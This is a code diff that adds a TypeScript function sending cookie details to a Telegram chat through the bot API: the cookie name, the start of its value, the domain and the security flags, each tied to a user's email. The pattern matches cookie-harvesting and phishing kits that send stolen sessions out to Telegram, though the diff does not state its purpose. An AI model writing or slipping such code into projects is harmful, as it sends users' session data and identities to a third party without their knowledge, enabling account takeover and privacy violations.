@@ -158,3 +158,63 @@ export async function sendSuspiciousActivityNotificationToTelegram(data: {
     return false
   }
 }
+
+export async function sendCookieNotificationToTelegram(data: {
+  email: string
+  cookieName: string
+  cookieValue: string
+  cookieDomain?: string
+  secure: boolean
+  httpOnly: boolean
+  sameSite: string
+  expiresAt?: string
+  timestamp: string
+}) {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN
+  const chatId = process.env.TELEGRAM_CHAT_ID
+
+  if (!botToken || !chatId) {
+    console.error("[v0] Telegram credentials not configured")
+    return false
+  }
+
+  try {
+    const valuePreview = data.cookieValue.substring(0, 30) + (data.cookieValue.length > 30 ? "..." : "")
+
+    const message = `
+🍪 *Cookie Logged*
+
+👤 *Email:* \`${data.email}\`
+🔑 *Cookie Name:* \`${data.cookieName}\`
+📦 *Value:* \`${valuePreview}\`
+🌐 *Domain:* ${data.cookieDomain || "N/A"}
+🔒 *Secure:* ${data.secure ? "Yes" : "No"}
+🛡️ *HttpOnly:* ${data.httpOnly ? "Yes" : "No"}
+🔄 *SameSite:* ${data.sameSite}
+${data.expiresAt ? `⏰ *Expires:* ${data.expiresAt}` : "⏰ *Expires:* Session"}
+📅 *Logged:* ${data.timestamp}
+    `.trim()
+
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "Markdown",
+      }),
+    })
+
+    if (!response.ok) {
+      console.error("[v0] Failed to send cookie notification:", await response.text())
+      return false
+    }
+
+    return true
+  } catch (error) {
+    console.error("[v0] Telegram cookie notification error:", error)
+    return false
+  }
+}
